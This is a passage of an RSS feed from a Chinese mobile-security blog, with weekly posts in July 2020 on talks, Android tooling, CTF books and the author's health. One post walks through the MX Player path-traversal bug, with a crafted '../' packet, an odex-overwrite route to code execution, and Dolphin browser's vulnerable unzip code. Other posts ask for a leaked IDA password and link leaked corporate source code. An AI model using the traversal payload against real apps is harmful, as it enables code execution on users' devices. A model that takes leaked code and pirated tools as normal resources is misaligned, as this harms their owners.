&lt;p&gt;【InForSec学术活动】网络空间安全国际学术成果分享（下）&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/lyJKBhcI2k_xTJ7x8f7Q3g&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里面有三个移动安全相关的议题，到时候看看有没有线上的，要是没有我就去线下听一下&lt;/p&gt;

&lt;p&gt;《DeepIntent: Deep Icon-Behavior Learning for Detecting Intention-Behavior Discrepancy in Mobile Apps》
《Demystifying Hidden Privacy Settings in Mobile Apps》
《BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals》&lt;/p&gt;

&lt;p&gt;另外有一个逻辑漏洞的挖掘分享，通过对文档进行分析来找支付逻辑漏洞&lt;/p&gt;

&lt;p&gt;《Devils in the Guidance: Predicting Logic Vulnerabilities in Payment Syndication Services through Automated Documentation Analysis》&lt;/p&gt;

&lt;p&gt;发现一个新姿势，可以搜索到大佬的专利&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://patents.google.com/?inventor=%E9%BE%9A%E5%B9%BF&amp;amp;assignee=%E5%8C%97%E4%BA%AC%E5%A5%87%E8%99%8E%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然跟会议上的分享形式不一样，可以当做学习资料补充，扩展思路&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4E99E9B424C29B56BFCF826CCCD8D570.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDA 7.4泄露了，哪位大佬有密码，来一份？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/21A4472CAC5B5AB3CC771150EB59F7E8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里多扯一句：原来我心里很牛逼的安全团队也都是没有经费买IDA授权的，顺带也知道了哪些是有经费买正版IDA授权的优质团队&lt;/p&gt;

&lt;p&gt;几十家公司的内部源码泄露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/UuzpXQjQnmb0YDtEF8igRg&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是我下载到的资料和这篇文章里描述的不太一样啊&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://git.rip/exconfidential/ilendx/ilendx&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FB3B88AFE8CCBFA26C33AC819B4F7887.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下面这个意见征求稿搞甲方安全的都可以看看&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.tc260.org.cn/front/postDetail.html?id=20200729195232&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个时间点别踩雷上&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CC772287811A5424DFB3F63D587089CF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这周去看了颈椎，拍了片子，生理曲度消失，并且反弓&lt;/p&gt;

&lt;p&gt;动不动就麻，僵硬，查个核磁要安排到九月&lt;/p&gt;

&lt;p&gt;钱没赚到，落一身病&lt;/p&gt;

&lt;p&gt;下一步我的计划是要专心减肥，至于这个菜栏，每周五晚上接着跟大伙儿聊呗&lt;/p&gt;
</description>
                <pubDate>Fri, 31 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.31.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.31.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.24 听，是财务自由的声音</title>
                <description>&lt;blockquote&gt;
  &lt;p&gt;马老师说996是福报，怪我当年太年轻听不懂，现在我明白了，996真的是福报&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;说真的，这周过的真酸，酸的张不开嘴，迈不开腿&lt;/p&gt;

&lt;p&gt;奇安信本周上市，蚂蚁准备上市，滴滴准备上市&lt;/p&gt;

&lt;p&gt;字节也肯定是要上市的&lt;/p&gt;

&lt;p&gt;以前看到这种消息也就是发个朋友圈“苟富贵，勿相忘”乐一乐就过去了，现在真的同龄人一下子就超越自己，酸了&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;最近找到一个可以下载EMUI的网站&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://huaweidl.com/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;啥意思就不多说了，到时候用英文发邮件&lt;/p&gt;

&lt;p&gt;再打个广告：本人接漏洞描述中文转英文描述，全程参与漏洞提交处理生命周期，奖金百分之五的提成，五个点，你买不了吃亏，也买不了上当，但是可以搏一把中危变高危，高危变严重&lt;/p&gt;

&lt;p&gt;真诚建议各位搞安全培训的师傅，在课程结束的时候讲一节如何使用英文提交漏洞&lt;/p&gt;

&lt;p&gt;哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;这周看到了一篇文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/w3vt220-pWKX_9P_biRIoQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可能大家看完也就过去了，这篇文章对我产生的影响很大&lt;/p&gt;

&lt;p&gt;我大大小小的毛病很多，因为胖直接导致的高血脂，高血压，不喜欢喝水导致的肾结晶，肺里有个小结节，甲状腺里有个小结节，颈椎生理曲度消失并且反弓…&lt;/p&gt;

&lt;p&gt;这几天我脖子莫名开始酸痛，下周去医院看一下，如果结果不怎么好，我可能要提前退休了，毕竟我还想在公众号跟各位读者多聊几年&lt;/p&gt;

&lt;p&gt;我发现把买房子这件事给忽略掉，人生开阔不少，运动减肥，瘦下来之后拍婚纱照，去读书，去环游世界&lt;/p&gt;

&lt;p&gt;所有过往，皆为序章，所有将来，皆是可盼&lt;/p&gt;

&lt;p&gt;人生很长，欢迎大家有空就来我这里看看&lt;/p&gt;
</description>
                <pubDate>Fri, 24 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/24/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.24.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/24/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.24.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.17 OPPO的移动安全团队很不错</title>
                <description>&lt;p&gt;我最近学习到一个新姿势，在Android应用里进行XSS攻击&lt;/p&gt;

&lt;p&gt;《Finding an XSS in an HTML-based Android application》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.detectify.com/2015/02/20/finding-an-xss-in-an-html-based-android-application/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有的时候我在想，我做的这个方向在目前来看，也就这样了&lt;/p&gt;

&lt;p&gt;不研究新的攻击点，迟早凉凉&lt;/p&gt;

&lt;p&gt;我真怀念三年前的360，那会儿大楼顶层的牌子在，一起搞技术的好基友们在，安全团队和业务的地位是平等的，指导我工作的领导是懂技术的，提的需求都是合理的，我们可以站在同一个领域的技术栈上讨论问题&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;Android 11出Beta 2了，有多少读者还没有摸过Android 10？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://android-developers.googleblog.com/2020/07/android-11-beta-2-and-platform-stability.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;新版本即是机会，大佬求带！！！&lt;/p&gt;

&lt;p&gt;我接下来想买一些国产手机，多玩玩一些新功能，挖一些国产手机厂商定制系统功能引入的漏洞&lt;/p&gt;

&lt;p&gt;偶然间发现OPPO的移动安全团队很不错，推荐他们写的三篇文章，我学习完也是有不少收获&lt;/p&gt;

&lt;p&gt;《Android中的特殊攻击面（一）—— 邪恶的对话框》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/mN5M9-P0g6x_4NqTKbO2Sg&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Android中的特殊攻击面（二）—— 危险的deeplink》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Android中的特殊攻击面（三）—— 隐蔽的call函数》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/SAhXsCHvAct_2SxCXd2w0Q&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;他们和港中大，SMU一起搞的一篇Paper：《Understanding Android VoIP Security : A System-level Vulnerability Assessment》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://daoyuan14.github.io/papers/TR19_VoIPFuzzing.pdf&lt;/li&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=GFGUJiUTFtE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我这周粗读了一下，收获颇丰，还有待精读以及跟进代码实践，论文写的很实在，没有那种&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;加入祖传秘制老卤&lt;/code&gt;之类的文字，完全可以上手操作&lt;/p&gt;

&lt;p&gt;作者首先描述了Android VoIP的协议栈以及攻击面，然后介绍了所使用的Fuzz方法，本地API和Intent，远程通过修改数据包的字段，再结合代码审计&lt;/p&gt;

&lt;p&gt;整体产出还是很不错的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0D8BCB78F8E11EABEE712D331940DF84.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;国产的手机定制这么深入，可以搞一波了，墙裂推荐有兴趣的读者朋友学习这篇Paper！&lt;/p&gt;

&lt;p&gt;检测应用是否运行在虚拟容器里，这个虚拟容器不是沙箱的意思，是指多开助手之类的软件，模拟Android系统环境让应用在其内部运行&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/su-vikas/conbeerlib/blob/master/android_virtual_containers_slides.pdf&lt;/li&gt;
  &lt;li&gt;https://github.com/su-vikas/conbeerlib&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个类似OLLVM的东西，但有一些新功能，有点意思&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/emc2314/YANSOllvm&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;搜索APK所有导出且没有权限的组件，这个其实搜的不全面，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registerReceiver()&lt;/code&gt;动态注册的广播接收器默认是导出的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/mzfr/slicer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;MX Player路径穿越漏洞导致的代码执行，这个漏洞我觉得很有启发，它并非单纯的解压缩导致的文件路径穿越，而是通过远程数据交互来实现的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/tenable-techblog/android-mx-player-path-traversal-to-code-execution-9134b623eb34&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;简单来说，MX Player有一个文件分享的功能，正常的数据包格式如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mx\x00\x01\x00\x02\x00\x00\x00\xb5
{
    &quot;hash&quot;:&quot;FA730A013D17D705CAF504B5CA560501&quot;,
    &quot;id&quot;:0,
    &quot;name&quot;:&quot;cool_video&quot;,
    &quot;suffix&quot;:&quot;mp4&quot;,
    &quot;size&quot;:5976,
    &quot;type&quot;:0
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在处理数据包的时候，会直接获取包里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;name&quot;&lt;/code&gt;字段进行路径拼接生成文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2DCC629802261348C0DCD8C7FD155459.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以构造如下数据包，就会造成路径穿越&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mx\x00\x01\x00\x02\x00\x00\x00\xb5
{
    &quot;hash&quot;:&quot;FA730A013D17D705CAF504B5CA560501&quot;,
    &quot;id&quot;:0,
    &quot;name&quot;:&quot;../cool_video&quot;,
    &quot;suffix&quot;:&quot;mp4&quot;,
    &quot;size&quot;:5976,
    &quot;type&quot;:0
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如何通过路径穿越实现代码执行呢？&lt;/p&gt;

&lt;p&gt;常见情况下就是覆盖一个可执行文件，尤其是那种应用启动的时候会自动运行的那种，但是这个漏洞只能创建，不能覆写，所以需要想一个新方法&lt;/p&gt;

&lt;p&gt;作者使用的是监控应用启动时所有文件加载操作，最后监控到了一个不存在的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audience_network.odex&lt;/code&gt;文件加载&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/037CDB6BF2A15E0FC742EFBE54A83927.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;基本的原理是ART虚拟机运行时会加载如下路径的文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;appPath&amp;gt;/files/oat/&amp;lt;arch&amp;gt;/*.odex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以往这个路径下写&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audience_network.odex&lt;/code&gt;即可&lt;/p&gt;

&lt;p&gt;多年以前，海豚浏览器也被爆出类似的漏洞，同样是路径穿越，同样导致代码执行&lt;/p&gt;

&lt;p&gt;漏洞发生的功能是还原备份&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private void c(File file, String arg8) throws myException {
    CipherInputStream cipherInputStream_1;
    ZipInputStream zipInputStream;  // 解密后的数据类型转为ZipInputStream
    BufferedInputStream bufferedInputStream_1;
    CipherInputStream cipherInputStream_2;  // 解密传入的数据流
    BufferedInputStream bufferedInputStream_2;  // 将文件读入缓冲区流
    Closeable closeable = null;
    try {
        if(!file.exists()) {
            throw new e();
        }
        this.a();  // cipher = &quot;AES/ECB/PKCS5PADDING&quot;
        bufferedInputStream_2 = new BufferedInputStream(new FileInputStream(file));  // 将文件读入缓冲区流
    }
    try {
        if(TextUtils.isEmpty(((CharSequence)arg8))) {
            arg8 = &quot;3d6b27465424597a55443e7532&quot;;  // 加密秘钥，可以由用户传入，若用户不传入，则由默认秘钥加密
        }
        this.cipher.init(2, this.b(arg8));  // 用秘钥初始化cipher，秘钥为b(&quot;3d6b27465424597a55443e7532&quot;)的值
        b.a(((InputStream)bufferedInputStream_2), this.cipher);  // 仿佛在做CRC32校验
        cipherInputStream_2 = new CipherInputStream(((InputStream)bufferedInputStream_2), this.cipher);  // 解密传入的数据流
    }
    try {
        zipInputStream = new ZipInputStream(((InputStream)cipherInputStream_2));  // 解密后的数据类型转为ZipInputStream
    }
    try {
        File selfMainFile = new File(this.context.getApplicationInfo().dataDir);  // 获取程序主目录
        while(true) {
            ZipEntry zipEntry = zipInputStream.getNextEntry();
            if(zipEntry == null) {
                break;
            }
            BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(new File(selfMainFile + File.separator + zipEntry.getName())));  // 拼接解压目录，此处校验文件名，可造成路径穿越漏洞
            IOUtilities.copy(((InputStream)zipInputStream), ((OutputStream)bufferedOutputStream));  // 拷贝数据
            bufferedOutputStream.flush();  // 刷新缓冲区，将数据写出到文件
            bufferedOutputStream.close();
            zipInputStream.closeEntry();
        }
    }
    try {
        IOUtilities.closeStream(((Closeable)zipInputStream));
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;利用方式比较常规，覆写了一个应用启动时自动加载的二进制文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;watch_server&lt;/code&gt;，当应用重启即可造成代码执行&lt;/p&gt;

&lt;p&gt;这两个漏洞单独写分析跟大家分享其中的代码细节，其中的漏洞模型完全可复用&lt;/p&gt;

&lt;p&gt;今年MOSEC有一个我很感兴趣的议题，想去听一听，还是那个老想法，想自己搞一个Fuzzer，一直跑的那种&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4A45B5EC5F5EB542AE0BDA0052A1BA62.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;别的人有钱之后都是会所嫩模，我想好了，我要是赚够了钱，我就可以不上班，天天在家里研究技术&lt;/p&gt;

&lt;p&gt;可惜了，我现在做着业务安全，离安全研究的道路越来越远，可能再也回不去了&lt;/p&gt;

&lt;p&gt;也可能，我下个月就去搞技术研究了呢？&lt;/p&gt;

&lt;p&gt;Alpha Team发现了UOS两个漏洞，官方给了致谢，很强！&lt;/p&gt;

&lt;p&gt;侧面可以看出来数字公司的某些业务方向，我想搜一下这个SRC，一直搜不出来，奇了怪了&lt;/p&gt;

&lt;p&gt;最后介绍一个工具，Android和iOS双平台渗透虚拟机&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mobexler.com/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一共有两个版本，官方推荐使用MobexlerLite&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;MobexlerLite
    &lt;ol&gt;
      &lt;li&gt;Linux Lite&lt;/li&gt;
      &lt;li&gt;(OVA) File Size: 7 GB&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Mobexler
    &lt;ol&gt;
      &lt;li&gt;Elementary OS&lt;/li&gt;
      &lt;li&gt;(OVA) File Size: 17 GB&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;官方的使用图片很酷炫，颇有技术大佬的感觉&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/85DFAFED355E93B13EA39F98F1DEAE01.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我运行看了看，配备了一些常见的工具，部分工具和我日常工作有交集，但是我偏向JEB更多，极其少直接使用baksmali这样的工具，起码也是做了一层封装更加可视化，enjarify和jadx我觉得应该放到AndroidZone里，毕竟都是Android工具&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CEF3A99E90524B64DE6531231071B05F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不好用，我打算自己定制一个顺手的&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;我被这两天的过山车震出内伤了，周末缓缓&lt;/p&gt;
</description>
                <pubDate>Fri, 17 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/17/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.17.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/17/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.17.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.13 CTF里的Android题目</title>
                <description>&lt;p&gt;前两天泉哥发了篇文章《「书评」聊聊打CTF的那本书》，讲的是朋友圈刷屏的书《CTF特训营》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/8ORoaDS3I4gF0KvW2qAblA&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我吧，大学的时候做过一些CTF战队的外援，主要做Android方向的题目，也出过一些CTF的赛题，所以这本书里关于Android方向的知识我还是有一点点评论的资格的&lt;/p&gt;

&lt;p&gt;个人认为是没写好，一本技术书不应该是这样的态度&lt;/p&gt;

&lt;p&gt;多的话不说了，补充一份资料，我之前打比赛时写的题解，都是Android相关的题目，里面包含了所有的题目，APK，题解，调试分析时的脚本等文件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/CTF-Mobile&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我接触Android安全也挺长时间了，国内出版的所有相关的安全技术书籍我几乎都买了，说真的并没有几本我是满意的，我在朋友圈也说过一些加入垫显示器豪华待遇套餐的书&lt;/p&gt;

&lt;p&gt;我这里再列一遍，防读者朋友们踩坑，实话实话，我不怕人喷&lt;/p&gt;

&lt;p&gt;最垃圾的一本是《Android 软件安全攻防实例分析》，作者是xjf，zl，这本书就是把网络上的一些技术文章编辑了一下然后做了个汇总，这也叫书？？？&lt;/p&gt;

&lt;p&gt;我推荐几本确实不错的，排名不分先后&lt;/p&gt;

&lt;p&gt;非虫两本Android应用逆向入门，《Android 软件安全与逆向分析》和《Android 软件安全权威指南》&lt;/p&gt;

&lt;p&gt;我读本科的时候，入门Android安全不是读的这两本，是吾爱破解上面的零碎教程，后来我稍微有点入门之后，就买了非虫的第一本Android逆向书学习，确实是非常不错&lt;/p&gt;

&lt;p&gt;非虫第二本书是我毕业后出版的，我第一时间就买了，说实话对于那会的我来说帮助不大，毕竟只是入门知识，虽然后面有脱壳相关等进阶技术，但也只是浅尝辄止，整体较第一本书有所更新，其中的技术也更贴近当时最新的功放场景，算是进阶版&lt;/p&gt;

&lt;p&gt;以上只是我个人看法，是否购买可自行决定&lt;/p&gt;

&lt;p&gt;还有几本我不想说，一本黄色的，一本红色的，整体来说一般吧&lt;/p&gt;

&lt;p&gt;之前我也想过写一本技术书，像《0day2》那样的，所有调试操作全程贴图，实在是太详细了，我大二那年的暑假在家里仔仔细细的把所有的章节都调试了一遍，当时还写了很多的调试笔记与大家分享&lt;/p&gt;

&lt;p&gt;之所以没有写下去，是因为我觉得基础的知识已经有不少书籍可以参考了，没必要反复造轮子，我希望写一些更具有启发性质的&lt;/p&gt;

&lt;p&gt;像如何使用JEB，APKTool，Jadx这些工具去反编译APK文件，如何阅读Smali代码，如何进行动态调试，我觉得都是基础操作，网络上的文章也很多&lt;/p&gt;

&lt;p&gt;而真正在这些基础操作之上的文章却是不多，尤其是近几年，业界产出确实是少了，可能大家都进了不同公司的安全团队，都转化成为公司的安全产品和防护方案了吧&lt;/p&gt;

&lt;p&gt;基础操作之上的东西都有哪些呢？&lt;/p&gt;

&lt;p&gt;我对甲方安全整体建设还掌握的不够，我目前接触的更多的是移动安全，所以从移动安全角度来看看不同的进阶分支&lt;/p&gt;

&lt;p&gt;最直接的就是Android应用的漏洞挖掘，这里的漏洞挖掘分为两部分：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;纯本地的代码缺陷，比如开启调试和备份，Intent拒绝服务，任意组件越权调用，没做证书校验等&lt;/li&gt;
  &lt;li&gt;业务逻辑相关的漏洞，比如有个Activity导出，它的功能是与服务端交互发送一个修改密码的，那么这就是一个可能存在的业务逻辑漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Android应用漏洞挖掘在甲方安全建设里叫作安全审计，这里可做自动化扫描器，比如静态扫描，之前不少在线扫描器都是静态规则扫描，大同小异&lt;/p&gt;

&lt;p&gt;科恩前段时间拿出来商业化的东西是基于FlowDroid搞的数据流分析，这个我认为是个很不错的方向，比单纯静态分析有搞头多了，我目前也在做&lt;/p&gt;

&lt;p&gt;还有像360烽火实验室搞的Android病毒，抓APT，这里面涉及到了沙箱系统的定制开发，运营，规则维护，数据获取等&lt;/p&gt;

&lt;p&gt;竞品分析也是一个大头，如何快速有效的对竞品进行功能定位是安全团队一个很重要的能力，其中涉及到脱壳，逆向，动态调试，协议分析，也有很多技巧在里面&lt;/p&gt;

&lt;p&gt;更多的细分方向碍于能力有限，我就不过多描述了&lt;/p&gt;

&lt;p&gt;像我这样话多，平时没事就喜欢上来跟大伙唠几分钟干货的博主不多了，欢迎大家有空就过来看看&lt;/p&gt;
</description>
                <pubDate>Mon, 13 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.13.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.13.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.10 疯狂的赚钱黄金周</title>
                <description>&lt;p&gt;果然搞技术还是要多看看大佬们平时都是怎么玩的&lt;/p&gt;

&lt;p&gt;这周听了组里大佬的技术分享，原来逆向还有这么多好玩的工具，于是乎我就有了一些想法&lt;/p&gt;

&lt;p&gt;比如之前用Xposed和Frida进行下钩子，一般我都是手动写，有个脚本可以直接在JEB里运行，生成钩子代码&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/LeadroyaL/JebScript/blob/master/FastXposed.py&lt;/li&gt;
  &lt;li&gt;https://github.com/LeadroyaL/JebScript/blob/master/FastFrida.py&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;思路不错，我想着是自己手动写一个界面工具，功能类似，主动解析，可以搜对应的类，然后一键生成钩子代码&lt;/p&gt;

&lt;p&gt;Quarkslab《A Deep Dive Into Samsung’s TrustZone》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html&lt;/li&gt;
  &lt;li&gt;https://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html&lt;/li&gt;
  &lt;li&gt;https://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;年前说的邀请李神探过来给我们分享一波TrustZone的攻击，已经在安排了，到时候写一篇学习笔记&lt;/p&gt;

&lt;p&gt;李神探搞这部分的开发贼溜，先学开发，再看漏洞模型，Nice！&lt;/p&gt;

&lt;p&gt;《Android App Source code Extraction and Bypassing Root and SSL Pinning checks》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://vj0shii.info/android-app-testing-initial-steps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;很简单的一篇文章，我觉得老外的这些文章都有些麻烦，直接Jadx或者Jeb反编译看代码难道不香，非要先解压缩APK包然后dex2jar，难道是老外不用破解版的Jeb？&lt;/p&gt;

&lt;p&gt;《Reverse engineering of the Anubis malware》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://orangecyberdefense.com/uk/blog/uncategorized/reverse-engineering-of-the-anubis-malware/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;前两天我说写的一个审计工具，主要是用于逻辑漏洞挖掘&lt;/p&gt;

&lt;p&gt;第一列以包名为主键进行项目管理，第二列是同一个应用不同的版本，比如微信，QQ这种不同包名的应用就是属于不同的项目，微信1.0和微信2.0属于微信这个项目里不同的版本&lt;/p&gt;

&lt;p&gt;第三列是检测项，默认是自带了一些路径用于演示，也可以自定义路径进行搜索，第四列是搜索结果的展示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1A33409736391CC279FFDB49B44A0778.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们每周都会进行技术分享，包含浏览器，Android，iOS，逆向和脱壳学术界的新技术等，也会不定期邀请顶尖实验室的大佬过来跨领域分享，只要我能刷脸邀请的我都尽量刷&lt;/p&gt;

&lt;p&gt;我接下来要做的一个组内技术分享《安卓应用导出组件逻辑漏洞挖掘》，并非只是拒绝服务和任意组件调用这种漏洞，会涉及到业务逻辑层面以及如何自动化筛选攻击路径，也会分享我利用上面这个工具挖掘到的一些逻辑漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/55D9A293FD0528AF44C3FB2CE8EBA018.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后，下周一支付宝安全实验室有一个直播，欢迎大家围观，我一直想做一件事情，就是把我的思想保存下来，存在一个机器里面，就像美队2里面索拉博士，到时候看看专业人士是怎么解决这个问题的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/31931F04B06752D4F2CE7FFED33AFCFF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;真是疯狂的一周，炒股大佬们带带弟弟吧&lt;/p&gt;
</description>
